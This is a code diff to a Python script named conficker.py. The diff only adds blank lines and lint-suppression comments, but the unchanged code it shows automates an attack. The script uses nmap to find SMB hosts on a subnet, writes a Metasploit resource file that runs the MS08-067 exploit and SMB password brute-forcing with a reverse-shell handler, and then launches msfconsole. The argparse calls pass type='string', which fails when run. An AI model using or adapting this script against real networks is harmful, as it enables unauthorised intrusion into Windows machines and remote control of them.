@@ -4,6 +4,7 @@ import argparse
 import sys
 import nmap
 
+
 def findTgts(subNet):
     ''' find the targets'''
     nmScan = nmap.PortScanner()
@@ -17,6 +18,7 @@ def findTgts(subNet):
                 tgtHosts.append(host)
     return tgtHosts
 
+
 def setupHandler(configFile, lhost, lport):
     ''' setup the handler'''
     configFile.write('use exploit/multi/handler\n')
@@ -26,6 +28,7 @@ def setupHandler(configFile, lhost, lport):
     configFile.write('exploit -j -z\n')
     configFile.write('setg DisablePayloadHandler 1\n')
 
+
 def confickerExploit(configFile, tgtHost, lhost, lport):
     ''' conficker exploit'''
     configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
@@ -34,6 +37,7 @@ def confickerExploit(configFile, tgtHost, lhost, lport):
     configFile.write('set LPORT ' + str(lport) + '\n')
     configFile.write('set LHOST ' + lhost + '\n')
     configFile.write('exploit -j -z\n')
+
 
 def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
     ''' smb brute'''
@@ -50,14 +54,15 @@ def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
             configFile.write('set LHOST ' + lhost + '\n')
             configFile.write('exploit -j -z\n')
 
+
 def main():
     ''' main function'''
     with open('meta.rc', 'w', encoding='utf-8-sig') as configFile:
-        parser = argparse.ArgumentParser(usage='conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
-        parser.add_argument('-H', type='string', help='specify the target address[es]')
-        parser.add_argument('-p', type='string', help='specify the listen port')
-        parser.add_argument('-l', type='string', help='specify the listen address')
-        parser.add_argument('-F', type='string', help='password file for SMB brute force attempt')
+        parser = argparse.ArgumentParser(usage='conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')  # noqa: E501
+        parser.add_argument('-H', type='string', help='specify the target address[es]')  # noqa: E501
+        parser.add_argument('-p', type='string', help='specify the listen port')  # noqa: E501
+        parser.add_argument('-l', type='string', help='specify the listen address')  # noqa: E501
+        parser.add_argument('-F', type='string', help='password file for SMB brute force attempt')  # noqa: E501
         args = parser.parse_args()
         args.tgtHost = str(args.H)
         args.lport = str(args.p)
@@ -79,6 +84,7 @@ def main():
             if passwdFile is not None:
                 smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
     os.system('msfconsole -r meta.rc')
+
 
 if __name__ == '__main__':
     main()
